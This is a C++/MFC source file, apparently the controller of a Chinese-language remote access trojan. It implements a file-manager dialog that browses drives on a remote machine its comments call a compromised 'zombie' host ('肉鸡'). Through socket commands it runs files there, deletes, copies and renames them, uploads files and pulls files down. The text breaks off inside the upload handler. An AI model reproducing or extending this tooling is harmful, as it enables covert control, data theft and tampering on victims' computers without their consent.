// FileView.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "FileView.h"
#include "Common.h"
#include "FileManager.h"
#include "FolderDlg.h"
#include "FileRenDlg.h"
#include "AttriDlg.h"

// CFileView 对话框

IMPLEMENT_DYNAMIC(CFileView, CDialog)

CFileView::CFileView(CWnd* pParent /*=NULL*/, SOCKET sock)
	: CDialog(CFileView::IDD, pParent)
{
	m_socket = sock;
	m_pWndMsg = pParent;
	m_bCopy = false;
}

CFileView::~CFileView()
{
}

void CFileView::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TREE_FILE, m_treeFile);
	DDX_Control(pDX, IDC_LIST_FILE, m_listCtrl);
}


BEGIN_MESSAGE_MAP(CFileView, CDialog)
	ON_NOTIFY(TVN_SELCHANGED, IDC_TREE_FILE, &CFileView::OnTvnSelchangedTreeFile)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_FILE, &CFileView::OnNMRClickListFile)
	ON_COMMAND(ID_FILE_DOWNLOAD, &CFileView::OnFileDownload)
	ON_COMMAND(ID_FILE_UPLOAD, &CFileView::OnFileUpload)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_FILE, &CFileView::OnNMDblclkListFile)
	ON_COMMAND(ID_FILE_RUN, &CFileView::OnFileRun)
	ON_COMMAND(ID_FILE_FLUSH, &CFileView::OnFileRefresh)
	ON_COMMAND(ID_FILE_CREATE, &CFileView::OnFolderCreate)
	ON_COMMAND(ID_FILE_DEL, &CFileView::OnFileDel)
	ON_COMMAND(ID_FILE_COPY, &CFileView::OnFileCopy)
	ON_COMMAND(ID_FILE_PASTE, &CFileView::OnFilePaste)
	ON_COMMAND(ID_FILE_RENAME, &CFileView::OnFileRename)
	ON_COMMAND(ID_FILE_ATTRIBUTE, &CFileView::OnFileAttribute)
END_MESSAGE_MAP()


// CFileView 消息处理程序
BOOL CFileView::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //如果按下的是回车键或ESC键，则截断消息
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CFileView::OnInitDialog()
{
	CDialog::OnInitDialog();
	bool bSuccess = true;
	InitDlg();
	GetClientRect(&m_rect);  //得到客户区大小
	MSGINFO msgInfo;
	memset(&msgInfo, 0, sizeof(MSGINFO));
	msgInfo.nMsgCmd = CMD_DISKINFO;   //获取磁盘信息
	UINT32 result = m_moduleSocket.SendCommand(m_socket, (char*)&msgInfo, sizeof(MSGINFO), &bSuccess);  //发送获取磁盘信息命令
	if (ERROR_SUCCESS != result && !bSuccess)
	{
		AfxMessageBox(_T("发送获取磁盘信息命令失败!"));
	}
	return TRUE;
}

void CFileView::InitDlg()
{
	m_ImageTree.Create(16, 16, ILC_COLOR24 | ILC_MASK, 1, 1);  //创建图像列表
	m_ImageList.Create(32, 32, ILC_COLOR24 | ILC_MASK, 20, 40);

	HICON hIcon[4];
	hIcon[0] = AfxGetApp()->LoadIcon(IDI_ICON_COMPUTER);    //我的电脑
	hIcon[1] = AfxGetApp()->LoadIcon(IDI_ICON_DISK);        //磁盘
	hIcon[2] = AfxGetApp()->LoadIcon(IDI_ICON_REMOVE);      //移动磁盘
	hIcon[3] = AfxGetApp()->LoadIcon(IDI_ICON_FOLDER);      //文件夹
	for (int index = 0; index < 4; index++)
	{
		m_ImageTree.Add(hIcon[index]);
	}
	m_treeFile.SetImageList(&m_ImageTree, TVSIL_NORMAL);
	m_Root_tree = m_treeFile.InsertItem(_T("远程电脑"), 0, 0, TVI_ROOT);
	
	m_listCtrl.SetImageList(&m_ImageList, LVSIL_SMALL);  //小图标(report模式)
	m_listCtrl.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
	m_listCtrl.InsertColumn(0, _T("文件名称"), LVCFMT_CENTER, 223);	
	m_listCtrl.InsertColumn(1, _T("文件类型"), LVCFMT_CENTER,  68);
	m_listCtrl.InsertColumn(2, _T("文件大小"), LVCFMT_CENTER, 100);
    
    //右键菜单图标
	m_MenuBmp[0].LoadBitmap(IDB_BMP_RUN);
	m_MenuBmp[1].LoadBitmap(IDB_BMP_REFRESH);
	m_MenuBmp[2].LoadBitmap(IDB_BMP_COPY);
	m_MenuBmp[3].LoadBitmap(IDB_BMP_PASTE);
	m_MenuBmp[4].LoadBitmap(IDB_BMP_DEL);
	m_MenuBmp[5].LoadBitmap(IDB_BMP_UPLOAD);
	m_MenuBmp[6].LoadBitmap(IDB_BMP_DOWNLOAD);
	m_MenuBmp[7].LoadBitmap(IDB_BMP_CREATE);

	m_nDirCount = 0;  //文件夹数目
}

void CFileView::SetDiskInfo( DRIVER_C tagDisk )
{
	DRIVER_C* pDriver_c = new DRIVER_C;  //这里new的原因是要存放setItemData数据
    CString strDiskName = _T("");
	int index = 0;
	switch (tagDisk.nType)
	{
	case DISK_FIXED:
		{
			strDiskName.Format(_T("%c:"), tagDisk.disk);
			index = 1;
		}
		break;
	case DISK_REMOVABLE:
		{
			strDiskName.Format(_T("%c:"), tagDisk.disk);
			index = 1;
		}
		break;
	case DISK_CDROM:
		{
			strDiskName.Format(_T("%c:"), tagDisk.disk);
			index = 2;
		}
		break;
	default:
		return;
	}
	HTREEITEM hItem = m_treeFile.InsertItem(strDiskName, index, index, m_Root_tree, 0);
	m_treeFile.Expand(m_Root_tree, TVE_EXPAND);
	memcpy(pDriver_c, &tagDisk, sizeof(tagDisk));
	m_treeFile.SetItemData(hItem, (DWORD)pDriver_c);  //将节点信息放入Item中
}

void CFileView::SetFileListInfo( IN FILEINFO_C tagFileInfo )
{
	int i = 0;
	switch (tagFileInfo.nType)
	{
	case FILE_ATTR:    //文件
		{
			int nCount = m_listCtrl.GetItemCount();  //已经获取到的数量
			SHFILEINFO shInfo; //mfc文件信息结构体
			memset((char*)&shInfo, 0, sizeof(shInfo));
		
			//利用文件扩展名来决定图标显示，比如传过来的是a.exe，则找到客户端exe文件图标显示的句柄.
            if (SHGetFileInfo(tagFileInfo.szFileName, 0, &shInfo, sizeof(shInfo), SHGFI_ICON |SHGFI_USEFILEATTRIBUTES))
			{
				i = m_ImageList.Add(shInfo.hIcon);   //将文件图标句柄添加到CImageList控件成员变量中
				m_listCtrl.InsertItem(nCount, tagFileInfo.szFileName, i);
			}
			else   //文件图标句柄获取失败! 则采用资源引入的文件图标
			{
				i = m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_ICON_FILE));
				m_listCtrl.InsertItem(nCount, tagFileInfo.szFileName, i);
			}
			m_listCtrl.SetItemText(nCount, 1, _T(""));
			__int64* pFileSize = new __int64(tagFileInfo.size);
			m_listCtrl.SetItemData(nCount, DWORD(pFileSize));
			CString strFileSize = _T("");  //文件大小
			strFileSize = GetRealSize(tagFileInfo.size);
			m_listCtrl.SetItemText(nCount, 2, strFileSize);
		}
		break;
	case FOLDER_ATTR:  //文件夹
		{
			m_treeFile.InsertItem(tagFileInfo.szFileName, 3, 3, m_hItem, 0);  //左边树控件
			i = m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_ICON_FOLDERLIST));  //文件夹图标
			m_listCtrl.InsertItem(m_nDirCount, tagFileInfo.szFileName, i);
			m_listCtrl.SetItemText(m_nDirCount, 1, _T("文件夹"));
			m_listCtrl.SetItemText(m_nDirCount, 2, _T("0"));
			m_nDirCount++;  //文件夹数量
		}
		break;
	case FILE_TAG:    //文件列表信息发送完毕
		{
	//		m_bFlag = true;
			m_treeFile.Expand(m_hItem, TVE_EXPAND);  //展开点击的节点
		}
		break;
	default:
		break;
	}
	UpDataStatusBar(m_hItem);
}

void CFileView::SetFileExecInfo(IN FILEEXECINFO_C tagFileInfo)
{
	CString strExecFile = _T(""); 
	if (tagFileInfo.bSuccess)  //执行成功
	{
		strExecFile = _T("恭喜,文件执行成功!");
	}
	else
	{
		strExecFile = _T("O shit,文件执行失败!");
	}
	TCHAR* pText = strExecFile.GetBuffer(strExecFile.GetLength());
	::SendMessage( ((CFileManager*)m_pWndMsg)->m_fileStatusBar, SB_SETTEXT, (WPARAM)1, (LPARAM)pText);
}

void CFileView::OnTvnSelchangedTreeFile(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMTREEVIEW pNMTreeView = reinterpret_cast<LPNMTREEVIEW>(pNMHDR);
	TVITEM item = pNMTreeView->itemNew;  //得到新项的信息
	m_listCtrl.DeleteAllItems();
	m_hItem = item.hItem;
	if (m_Root_tree == m_hItem)  //如果是根节点，则结束
	{
		return ;
	}
	DelChildItem(m_hItem);
	GetDlgItem(IDC_EDIT_CURPATH)->SetWindowText(GetCurFilePath(m_hItem));  //设置文本控件路径的值
	MSGINFO tagMsg;
	tagMsg.nMsgCmd = CMD_FILELIST;
	wchar_t szPath[MAX_PATH] = {0};
	wcscpy_s(szPath, GetCurFilePath(m_hItem));
	memcpy((char*)tagMsg.context, (char*)szPath, sizeof(szPath));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);  //发送当前磁盘路径信息
	m_nDirCount = 0;

	*pResult = 0;
}

void CFileView::UpDataStatusBar(HTREEITEM hItem)
{
	CString strLeftStatusBar = _T("");  //左边状态栏信息
	CString strRightStatusBar = _T("");  //右边状态栏
	if (m_Root_tree == hItem)
	{
		strLeftStatusBar = _T("就绪");
	}
	else if (m_Root_tree == m_treeFile.GetParentItem(hItem))
	{
		DRIVER_C* pDriver_C = (DRIVER_C*)m_treeFile.GetItemData(hItem);
		switch (pDriver_C->nType)
		{
		case DISK_FIXED:
			{
				strLeftStatusBar.Format(_T("本地磁盘 (%c)\n总大小: %0.2f GB"), pDriver_C->disk, pDriver_C->dwTotal);
				break;
			}
		case DISK_REMOVABLE:
			{
				strLeftStatusBar.Format(_T("可移动磁盘 (%c)\n总大小: %0.2f GB"), pDriver_C->disk, pDriver_C->dwTotal);
				break;
			}
		case DISK_CDROM:
			{
				strLeftStatusBar.Format(_T("CD-ROM光驱 (%c)\n总大小: %0.2f GB"),pDriver_C->disk, pDriver_C->dwTotal);
				break;
			}
		default:
			break;
		}
		strRightStatusBar.Format(_T("可用空间: %0.2f GB"), pDriver_C->dwFree);
	}
	else
	{
		int nFileCount = m_listCtrl.GetItemCount();
		strLeftStatusBar.Format(_T("%d 个对象"), nFileCount);
		strRightStatusBar.Format(_T(""));
	}
	TCHAR* pTextLeft = strLeftStatusBar.GetBuffer(strLeftStatusBar.GetLength());
	TCHAR* pTextRight = strRightStatusBar.GetBuffer(strRightStatusBar.GetLength());
	::SendMessage( ((CFileManager*)m_pWndMsg)->m_fileStatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)pTextLeft);
	::SendMessage( ((CFileManager*)m_pWndMsg)->m_fileStatusBar, SB_SETTEXT, (WPARAM)1, (LPARAM)pTextRight);
}

void CFileView::OnNMRClickListFile(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CString strCurPath;
	GetDlgItem(IDC_EDIT_CURPATH)->GetWindowText(strCurPath);
	if (strCurPath.IsEmpty())
	{
		return;
	}
	CMenu fileMenu;
	fileMenu.LoadMenu(IDR_MENU_FILE);
	CMenu *pSubMenu = fileMenu.GetSubMenu(0);
    
	pSubMenu->SetMenuItemBitmaps(ID_FILE_RUN, MF_BYCOMMAND, &m_MenuBmp[0], &m_MenuBmp[0]);  //运行
	pSubMenu->SetMenuItemBitmaps(ID_FILE_FLUSH, MF_BYCOMMAND, &m_MenuBmp[1], &m_MenuBmp[1]); //刷新
	pSubMenu->SetMenuItemBitmaps(ID_FILE_COPY, MF_BYCOMMAND, &m_MenuBmp[2], &m_MenuBmp[2]);   //copy
	pSubMenu->SetMenuItemBitmaps(ID_FILE_PASTE, MF_BYCOMMAND, &m_MenuBmp[3], &m_MenuBmp[3]);   //paste
	pSubMenu->SetMenuItemBitmaps(ID_FILE_DEL, MF_BYCOMMAND, &m_MenuBmp[4], &m_MenuBmp[4]);   //删除
	pSubMenu->SetMenuItemBitmaps(ID_FILE_UPLOAD, MF_BYCOMMAND, &m_MenuBmp[5], &m_MenuBmp[5]);   //上传
	pSubMenu->SetMenuItemBitmaps(ID_FILE_DOWNLOAD, MF_BYCOMMAND, &m_MenuBmp[6], &m_MenuBmp[6]);  //下载
	pSubMenu->SetMenuItemBitmaps(ID_FILE_CREATE, MF_BYCOMMAND, &m_MenuBmp[7], &m_MenuBmp[7]);  //新建
    int nItem = pNMItemActivate->iItem;  //选中项的索引值
    if (-1 == nItem) //没有选中项
	{
		pSubMenu->EnableMenuItem(ID_FILE_RUN, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_COPY, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_DEL, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_DOWNLOAD, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_RENAME, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_ATTRIBUTE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		if (!m_bCopy)  //能不能拷贝
		{
			pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);   //粘贴
		}
	}
	else
	{
		CString strType = m_listCtrl.GetItemText(nItem, 1);
		if (_T("文件夹") == strType) //选中的是文件夹
		{
			pSubMenu->EnableMenuItem(ID_FILE_RUN, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);   //运行
			pSubMenu->EnableMenuItem(ID_FILE_COPY, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //复制
			pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //粘贴
			pSubMenu->EnableMenuItem(ID_FILE_UPLOAD, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //上传
			pSubMenu->EnableMenuItem(ID_FILE_DOWNLOAD, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED); //下载
			pSubMenu->EnableMenuItem(ID_FILE_CREATE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //新建文件夹
			pSubMenu->EnableMenuItem(ID_FILE_ATTRIBUTE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		else //选中是文件
		{
			pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //粘贴
			pSubMenu->EnableMenuItem(ID_FILE_UPLOAD, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //上传
			pSubMenu->EnableMenuItem(ID_FILE_CREATE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //新建文件夹
		}
	}
	CPoint point;
	GetCursorPos(&point);  //获取光标位置
	pSubMenu->TrackPopupMenu(TPM_LEFTALIGN, point.x, point.y, this);
	*pResult = 0;
}

//鼠标双击List控件文件夹
void CFileView::OnNMDblclkListFile(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
    if (1 == m_listCtrl.GetSelectedCount())  //双击选中了一项
	{
		POSITION pos;
		pos = m_listCtrl.GetFirstSelectedItemPosition();
		if (NULL != pos)
		{
			int nItem = m_listCtrl.GetNextSelectedItem(pos);
			if (0 == m_listCtrl.GetItemText(nItem, 1).Compare(_T("文件夹")))   //双击选中的是文件夹
			{
				CString strCurFolderPath = _T("");  //该文件夹的路径
				CString strCurFolderName = _T("");  //文件夹的名称
				GetDlgItemText(IDC_EDIT_CURPATH, strCurFolderPath);
				if (_T("\\") != strCurFolderPath.Right(1))
				{
					strCurFolderPath += _T("\\");
				}
				strCurFolderName =  m_listCtrl.GetItemText(nItem, 0);  //加上文件名
				strCurFolderPath += strCurFolderName;
				m_hItem = GetCurhItemByPath(strCurFolderName);  //根据文件名得到当前树控件的句柄值
				m_listCtrl.DeleteAllItems();  //删除掉当前List控件所有项
				DelChildItem(m_hItem);
				GetDlgItem(IDC_EDIT_CURPATH)->SetWindowText(GetCurFilePath(m_hItem));  //设置文本控件路径的值
				MSGINFO tagMsg;
				tagMsg.nMsgCmd = CMD_FILELIST;
				wchar_t szPath[MAX_PATH] = {0};
				wcscpy_s(szPath, GetCurFilePath(m_hItem));
				memcpy((char*)tagMsg.context, (char*)szPath, sizeof(szPath));
				bool bSuccess = true;
				m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);  //发送当前磁盘路径信息
				m_nDirCount = 0;
			}
		}
	}

	*pResult = 0;
}

//-------------------------------------------------------------
//文件被执行
void CFileView::OnFileRun()
{
	// TODO: 在此添加命令处理程序代码
	MSGINFO tagMsg;
	POSITION pos = m_listCtrl.GetFirstSelectedItemPosition();
	if (NULL == pos)
	{
		return;
	}
	else
	{
		while (pos)
		{
			int nItem = m_listCtrl.GetNextSelectedItem(pos);
			CString strType = _T("");   //可执行文件的类型
			strType = m_listCtrl.GetItemText(nItem, 1);
			if (_T("文件夹") == strType)  //如果选中了文件夹
			{
				continue;
			}
			//获取远程执行文件的路径
			CString strFilePath = _T("");
			GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
			const CString strFileName = m_listCtrl.GetItemText(nItem, 0);  //得到文件的名称
			strFilePath += strFileName;
			memset(&tagMsg, 0, sizeof(MSGINFO));
			tagMsg.nMsgCmd = CMD_FILEEXEC;
			wchar_t szPath[MAX_PATH] = {0};
			wcscpy_s(szPath, strFilePath);
			memcpy((char*)tagMsg.context, (char*)szPath, sizeof(szPath));
			bool bSuccess = true;
			m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);  //发送执行文件命令
		}
	}
}

//刷新操作
void CFileView::OnFileRefresh()
{
	m_listCtrl.DeleteAllItems();
	if (m_Root_tree == m_hItem)  //如果是根节点，则结束
	{
		return ;
	}
	DelChildItem(m_hItem);
	GetDlgItem(IDC_EDIT_CURPATH)->SetWindowText(GetCurFilePath(m_hItem));  //设置文本控件路径的值
	MSGINFO tagMsg;
	tagMsg.nMsgCmd = CMD_REFRESH;
 	wchar_t szPath[MAX_PATH] = {0};
	wcscpy_s(szPath, GetCurFilePath(m_hItem));
	memcpy((char*)tagMsg.context, (char*)szPath, sizeof(szPath));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);  //发送当前磁盘路径信息
	m_nDirCount = 0;
}

//删除文件或文件夹
void CFileView::OnFileDel()
{
	FILEINFO_C tagFileInfo;  //文件信息
	if (IDYES == ::MessageBox(this->m_hWnd, _T("你确定要删除文件吗?"), _T("提示"), MB_YESNO | MB_ICONWARNING))
	{
		CString strDelPath = _T("");
		GetDlgItemText(IDC_EDIT_CURPATH, strDelPath);  //获取当前删除的路径
	
		POSITION pos = m_listCtrl.GetFirstSelectedItemPosition();
		if (NULL == pos)
		{
			return;
		}
		else
		{
			while (pos)
			{
				int nItem = m_listCtrl.GetNextSelectedItem(pos);
				memset(&tagFileInfo, 0, sizeof(FILEINFO_C));
				CString strType = _T("");   //删除文件的类型
				strType = m_listCtrl.GetItemText(nItem, 1);
				
				CString strDelName = _T("");
				strDelName = m_listCtrl.GetItemText(nItem, 0);   //删除文件的名称
				if (_T("文件夹") == strType)  //删除的是文件夹
				{
					tagFileInfo.nType = FOLDER_ATTR;
				}
				else   //删除的是文件
				{
					tagFileInfo.nType = FILE_ATTR;
				}
				strDelName = strDelPath + strDelName;   //构造删除的文件路径和名称
				wsprintfW(tagFileInfo.szFileName, _T("%s"), strDelName);  //CString 转成 TCHAR szbuf[MAX_PATH]
             
				MSGINFO tagMsgInfo;
				memset(&tagMsgInfo, 0, sizeof(MSGINFO));
				tagMsgInfo.nMsgCmd = CMD_FILE_DEL;
				memcpy((char*)tagMsgInfo.context, (char*)&tagFileInfo, sizeof(FILEINFO_C));
				bool bSuccess = true;
				m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
			    //下面的三行是重新显示文件列表信息，应该封装成一个函数
				m_listCtrl.DeleteAllItems();
				DelChildItem(m_hItem);
				m_nDirCount = 0;
			}
		}
	}
}

//新建文件夹(创建目录)
void CFileView::OnFolderCreate()
{
	CFolderDlg cFolderDir(this);
	cFolderDir.DoModal();
	if (cFolderDir.m_bOk)
	{
		CString strFilePath = _T("");
		GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
		CString strFolder = cFolderDir.GetFolderName();  //目录名
		strFilePath += strFolder;   //C:\\windows\1
		MSGINFO tagMsg;
		memset(&tagMsg, 0, sizeof(MSGINFO));
		tagMsg.nMsgCmd = CMD_FOLDER_CREATE;    //创建目录
	    wchar_t szPath[MAX_PATH] = {0};
		wcscpy_s(szPath, strFilePath);
		memcpy((char*)tagMsg.context, (char*)szPath, sizeof(szPath));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);
		m_listCtrl.DeleteAllItems();
		DelChildItem(m_hItem);
		m_nDirCount = 0;
 	}
}

//文件复制
void CFileView::OnFileCopy()
{
	int nCount = m_listCtrl.GetSelectedCount();
	bool bSuccess = true;
	if (0 == nCount)
	{
		m_bCopy = false;
	}
	else
	{
		m_bCopy = true;   //可以粘贴
	}

	POSITION pos = m_listCtrl.GetFirstSelectedItemPosition();
	if (NULL == pos)
	{
		return;
	}
	else
	{
		FILECOPY_C tagFileInfo;
		MSGINFO tagMsgInfo;
	
		memset(&tagFileInfo, 0, sizeof(FILECOPY_C));
		tagFileInfo.bTag = true;
		memset(&tagMsgInfo, 0, sizeof(MSGINFO));
		tagMsgInfo.nMsgCmd = CMD_FILE_COPY;
		memcpy((char*)tagMsgInfo.context, (char*)&tagFileInfo, sizeof(FILECOPY_C));
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);  //开始发送复制信息

		while (pos)
		{
			int nItem = m_listCtrl.GetNextSelectedItem(pos);
			CString strType = _T("");   //下载文件的类型
			strType = m_listCtrl.GetItemText(nItem, 1);
			if (_T("文件夹") == strType)  //如果下载的是文件夹
			{
				continue;
			}
			//获取远程文件的路径
			CString strFilePath = _T("");
			GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
			const CString strFileName = m_listCtrl.GetItemText(nItem, 0);  //得到文件的名称
			strFilePath += strFileName;

			memset(&tagMsgInfo, 0, sizeof(MSGINFO));
			tagMsgInfo.nMsgCmd = CMD_FILE_COPY;
			memset(&tagFileInfo, 0, sizeof(FILECOPY_C));
			tagFileInfo.bTag = false; 

			wcscpy_s(tagFileInfo.szFilePath, strFilePath);
			wcscpy_s(tagFileInfo.szFileName, strFileName);
			memcpy((char*)tagMsgInfo.context, (char*)&tagFileInfo, sizeof(FILECOPY_C));
			m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
		}
	}
}

//文件粘贴(主要的工作内容就是将当前拷贝存放的路径发送给肉鸡)
void CFileView::OnFilePaste()
{
	CString strFilePath = _T("");
	GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
	wchar_t szFilePath[MAX_PATH] = {0};
	wcscpy_s(szFilePath, strFilePath);
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_FILE_PASTE;
	memcpy((char*)tagMsgInfo.context, (char*)szFilePath, sizeof(szFilePath));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
	m_listCtrl.DeleteAllItems();
	DelChildItem(m_hItem);
	m_nDirCount = 0;
	m_bCopy = false;
}

//文件重命名
void CFileView::OnFileRename()
{
	// TODO: 在此添加命令处理程序代码
	POSITION pos = m_listCtrl.GetFirstSelectedItemPosition();
	if (NULL != pos)
	{
		int nItem = m_listCtrl.GetNextSelectedItem(pos);
		CFileRenDlg cFileRenDir(this, m_listCtrl.GetItemText(nItem, 0));
		cFileRenDir.DoModal();
		if (!cFileRenDir.m_bOk)
		{
			return;
		}
		FILECOPY_C tagFileInfo;
		memset(&tagFileInfo, 0, sizeof(FILECOPY_C));

		CString strType = m_listCtrl.GetItemText(nItem, 1);   //旧文件(夹)名
		if (0 == strType.Compare(_T("文件夹")))  //重命名的是文件夹
		{
			tagFileInfo.bTag = false;   //false表示的是文件夹
		}
		else
		{
			tagFileInfo.bTag = true;   //true表示的是文件
		}

		CString strFilePath = _T("");
		GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
		strFilePath += m_listCtrl.GetItemText(nItem, 0);   //C:\\windows\1

		wsprintfW(tagFileInfo.szFileName, cFileRenDir.GetFileName());   //旧文件(夹)全路径
		wsprintfW(tagFileInfo.szFilePath, strFilePath);  //新重命名名称

		MSGINFO tagMsg;
		memset(&tagMsg, 0, sizeof(MSGINFO));
		tagMsg.nMsgCmd = CMD_FILE_RENAME;    //重命名
		memcpy((char*)tagMsg.context, (char*)&tagFileInfo, sizeof(FILECOPY_C));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);
		m_listCtrl.DeleteAllItems();
		DelChildItem(m_hItem);
		m_nDirCount = 0;
	}
}

//查看文件或文件夹属性
void CFileView::OnFileAttribute()
{
	POSITION pos = m_listCtrl.GetFirstSelectedItemPosition();
	if (NULL != pos)
	{
		int nItem = m_listCtrl.GetNextSelectedItem(pos);
		ATTRIBUTE_C tagAttribute;
		memset(&tagAttribute, 0, sizeof(ATTRIBUTE_C));
		CString strType = m_listCtrl.GetItemText(nItem, 0);  //类型
		if (0 == strType.Compare(_T("文件夹")))
		{
			tagAttribute.nType = FOLDER_ATTR;
		}
		else
		{
			tagAttribute.nType = FILE_ATTR;
		}

		CString strFilePath = _T("");   //文件路径
		GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
		CString strFileName = _T("");  //文件名
		strFileName = m_listCtrl.GetItemText(nItem, 0);
		wsprintfW(tagAttribute.szFilePath, strFilePath);   //文件路径
		wsprintfW(tagAttribute.szFileName, strFileName);   //文件名
		
		MSGINFO tagMsg;
		memset(&tagMsg, 0, sizeof(MSGINFO));
		tagMsg.nMsgCmd = CMD_ATTRIBUTE;    //查看属性
		memcpy((char*)tagMsg.context, (char*)&tagAttribute, sizeof(ATTRIBUTE_C));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);
	}
}

//设置属性
void CFileView::SetArrtibuteInfo(IN ATTRIBUTE_C tagAttribute)
{
	CAttriDlg cAttributeDlg(this, &tagAttribute);
	cAttributeDlg.DoModal();   //显示属性对话框
}

//发送下载命令
void CFileView::OnFileDownload()
{
	// TODO: 在此添加命令处理程序代码
	CFileDir cFileDir(this);
	int iCount = 0;
	cFileDir.DoModal();
	if (cFileDir.m_bOk)
	{
		POSITION pos = m_listCtrl.GetFirstSelectedItemPosition();
		if (NULL == pos)
		{
			return;
		}
		else
		{
			while (pos)
			{
				int nItem = m_listCtrl.GetNextSelectedItem(pos);
				CString strType = _T("");   //下载文件的类型
				strType = m_listCtrl.GetItemText(nItem, 1);
				if (_T("文件夹") == strType)  //如果下载的是文件夹
				{
					continue;
				}
				//获取远程文件夹路径
				CString strFilePath = _T("");
				GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
				const CString strFileName = m_listCtrl.GetItemText(nItem, 0);  //得到文件的名称
				strFilePath += strFileName;
				//获取目标文件下载路径
				CString strDesFilePath = _T("");
				strDesFilePath = cFileDir.GetLocationPath();
				if (_T("\\") != strDesFilePath.Right(1))
				{
					strDesFilePath += _T("\\");
				}
				strDesFilePath += strFileName;
				//获取文件大小
				CString strFileSize = _T("");  //文件的大小
				strFileSize = m_listCtrl.GetItemText(nItem, 2);
				//获取文件的实际大小
				__int64 *puSize = (__int64*)(m_listCtrl.GetItemData(nItem));
				((CFileManager*)m_pWndMsg)->GetFileTransPoint()->OnAddFileList(0, strFilePath, strDesFilePath, strFileSize, puSize);
                iCount++;		
			}
			((CFileManager*)m_pWndMsg)->m_tabCtrl.SetCurFocus(1);
			CString strCount;
			strCount.Format(_T("当前下载数量: %d"), iCount);
			::SendMessage( ((CFileManager*)m_pWndMsg)->m_fileStatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)strCount.GetBuffer(0));
		}
	}
}

//文件上传
void CFileView::OnFileUpload()
{
	CFileDialog cUpLoadDlg(TRUE, NULL, NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, NULL, this);
	if (IDOK == cUpLoadDlg.DoModal())
	{
		CString strDesFilePath = _T("");  //本机文件路径
		CString strCurFilePath = _T("");  //上传到肉鸡上文件的路径
		strDesFilePath = cUpLoadDlg.GetPathName();  //C:\FILE\TEXT.DAT
		GetDlgItemText(IDC_EDIT_CURPATH, strCurFilePath);
		strCurFilePath += cUpLoadDlg.GetFileName();  //肉鸡上存放路径： D:\File\TEXT.DAT
